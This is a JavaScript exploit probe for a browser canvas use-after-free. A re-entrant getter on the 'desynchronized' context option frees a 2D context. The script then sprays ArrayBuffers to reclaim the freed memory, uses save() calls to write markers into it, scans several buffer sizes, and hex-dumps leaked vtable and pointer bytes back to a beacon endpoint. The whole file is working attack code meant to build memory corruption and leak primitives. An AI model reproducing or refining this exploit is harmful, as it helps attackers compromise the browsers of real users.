// p467b — Canvas UAF + minimal AB spray with GC idle window
// Uses setTimeout to let any page-load GC complete before UAF.
// Inline beacons at every step. NO GC pressure, NO pre-fill.
(function() {
  var R = 'p467b-' + Date.now().toString(36);
  function B(t, b) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/' + t + '/' + R, false);
      x.send(b || '');
    } catch(e) {}
  }
  B('BOOT', navigator.userAgent);

  // Delay 2s to let any in-progress GC cycle from page load complete.
  // setTimeout yields the main thread, allowing concurrent GC marker to finish.
  setTimeout(function() {
    B('S0-IDLE', 'gc-window-done');
    runProbe();
  }, 2000);

  function runProbe() {
    // === Step 1: Single UAF + immediate save ===
    try {
      var c = document.createElement('canvas');
      c.width = 1; c.height = 1;
      document.body.appendChild(c);
      var inner = null, tc = 0;
      var s = {};
      Object.defineProperty(s, 'desynchronized', {
        get: function() { tc++; if (tc === 1) inner = c.getContext('2d'); return false; }
      });
      var outer = c.getContext('2d', s);
      if (!inner || inner === outer) { B('S1-FAIL', 'no-uaf'); B('DONE', 'fail'); return; }
      B('S1-UAF', 'ok');
    } catch(e) {
      B('S1-ERR', e.message.slice(0,100)); B('DONE', 'err'); return;
    }

    // === Step 2: save() on freed-but-valid slot ===
    // m_canvas at +32 is STILL VALID (destructor doesn't clear references).
    // GC visiting now would succeed (reads valid canvas pointer).
    try {
      for (var i = 0; i < 42; i++) inner.save();
      B('S2-SAVE', 'ok-42');
    } catch(e) {
      B('S2-ERR', e.message.slice(0,100)); B('DONE', 'save-err'); return;
    }

    // === Step 3: Minimal AB spray — only 5 ABs at 768 bytes ===
    // 5 JSArrayBuffer objects = ~320 bytes GC allocation.
    // Should NOT trigger a new GC cycle.
    var abs3 = [];
    try {
      for (var i = 0; i < 5; i++) abs3.push(new ArrayBuffer(768));
      B('S3-AB', 'ok-5x768');
    } catch(e) {
      B('S3-ERR', e.message.slice(0,100));
    }

    // === Step 4: save() after spray — writes to AB if reclaimed ===
    // After calloc zeroed the slot, save() writes fresh marker.
    // Total at offset +592: 0 + marker2 (if reclaimed), or 42 + marker2 (if not).
    var MARKER2 = 35;
    try {
      for (var i = 0; i < MARKER2; i++) inner.save();
      B('S4-SAVE', 'ok-' + MARKER2);
    } catch(e) {
      B('S4-ERR', e.message.slice(0,100));
    }

    // === Step 5: Scan ABs at offset 592 and full scan ===
    var TARGET_RECLAIMED = MARKER2;        // 35 (calloc zeroed + fresh save)
    var TARGET_NOT_RECLAIMED = 42 + MARKER2; // 77 (original + fresh save)
    try {
      var hit = null;
      for (var pi = 0; pi < abs3.length; pi++) {
        var u32 = new Uint32Array(abs3[pi]);
        // Check known offset first
        if (u32[148] === TARGET_RECLAIMED || u32[148] === TARGET_NOT_RECLAIMED || u32[148] === 42) {
          hit = { pi: pi, off: 148, byteOff: 592, val: u32[148] };
          break;
        }
        // Full scan
        for (var j = 0; j < u32.length; j++) {
          if (u32[j] === TARGET_RECLAIMED || u32[j] === TARGET_NOT_RECLAIMED || u32[j] === 42) {
            hit = { pi: pi, off: j, byteOff: j * 4, val: u32[j] };
            break;
          }
        }
        if (hit) break;
      }

      if (hit) {
        B('S5-HIT', JSON.stringify(hit));
        // Confirm: increment and check
        try {
          inner.save();
          var nv = new Uint32Array(abs3[hit.pi])[hit.off];
          B('S5-CONFIRM', nv === hit.val + 1 ? 'OK-' + nv : 'FAIL-expected-' + (hit.val+1) + '-got-' + nv);
        } catch(e) { B('S5-CONFIRM-ERR', e.message.slice(0,80)); }
        // Hex dump first 128 bytes (vtable + pointers)
        var u8 = new Uint8Array(abs3[hit.pi]);
        var h = '';
        for (var i = 0; i < 128; i++) h += ('0' + u8[i].toString(16)).slice(-2);
        B('S5-DUMP0', h);
        h = '';
        for (var i = 128; i < 256; i++) h += ('0' + u8[i].toString(16)).slice(-2);
        B('S5-DUMP1', h);
        h = '';
        for (var i = 560; i < 640; i++) h += ('0' + u8[i].toString(16)).slice(-2);
        B('S5-DUMP2', h); // around the marker offset
      } else {
        B('S5-MISS768', 'no-hit-at-768');
      }
    } catch(e) {
      B('S5-ERR', e.message.slice(0,100));
    }

    // === Step 6: Try other sizes with fresh UAFs ===
    if (!hit) {
      var sizes = [640, 672, 704, 720, 736, 752, 800, 832, 864, 896, 960, 1024];
      for (var si = 0; si < sizes.length; si++) {
        var sz = sizes[si];
        var c2 = document.createElement('canvas');
        c2.width = 1; c2.height = 1;
        document.body.appendChild(c2);
        var inner2 = null, tc2 = 0;
        var s2 = {};
        Object.defineProperty(s2, 'desynchronized', {
          get: function() { tc2++; if (tc2 === 1) inner2 = c2.getContext('2d'); return false; }
        });
        try { c2.getContext('2d', s2); } catch(e) { continue; }
        if (!inner2) continue;

        var M = 60 + si;
        try { for (var k = 0; k < M; k++) inner2.save(); } catch(e) { continue; }

        var abs6 = [];
        for (var j = 0; j < 5; j++) abs6.push(new ArrayBuffer(sz));
        try { inner2.save(); } catch(e) {}

        var found = false;
        for (var j = 0; j < abs6.length; j++) {
          var v = new Uint32Array(abs6[j]);
          for (var off = 0; off < v.length; off++) {
            if (v[off] === M || v[off] === M + 1 || v[off] === 1) {
              B('S6-HIT', JSON.stringify({sz:sz, off:off*4, val:v[off], M:M}));
              try {
                inner2.save();
                var nv = new Uint32Array(abs6[j])[off];
                B('S6-CONFIRM', nv === v[off] + 1 ? 'OK' : 'FAIL-' + nv);
              } catch(e) {}
              var u8a = new Uint8Array(abs6[j]);
              var hx = '';
              for (var d = 0; d < 64; d++) hx += ('0'+u8a[d].toString(16)).slice(-2);
              B('S6-DUMP', hx);
              found = true;
              break;
            }
          }
          if (found) break;
        }
        if (!found) B('S6-MISS', String(sz));
        if (found) break;
      }
    }

    B('ALIVE', 'done');
    B('DONE', R);
  }
})();
